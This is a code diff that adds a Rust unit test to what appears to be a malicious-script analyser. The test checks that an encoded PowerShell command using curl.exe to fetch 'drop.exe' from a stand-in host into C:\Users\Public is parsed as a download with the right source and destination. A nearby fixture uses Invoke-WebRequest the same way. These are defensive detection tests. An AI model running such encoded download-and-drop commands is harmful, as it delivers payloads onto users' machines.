@@ -7351,6 +7351,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn curl_exe_output_equals_preserves_destination() {
+        let ps = r#"curl.exe "https://curl-output-equals.example/drop.exe" --output="C:\Users\Public\equals.exe""#;
+        let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-output-equals.example/drop.exe"
+                        && dst.as_deref() == Some("C:\\Users\\Public\\equals.exe")
+            )
+        });
+        assert!(
+            has,
+            "curl.exe --output= destination was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_liberal_slash_mixed_case_url_is_structured_download() {
         let ps = r#"Invoke-WebRequest -Uri "hTtP:\\liberal.example\drop.exe" -OutFile "drop.exe""#;
         let script = format!("powershell -EncodedCommand {}\r\n", encode(ps));
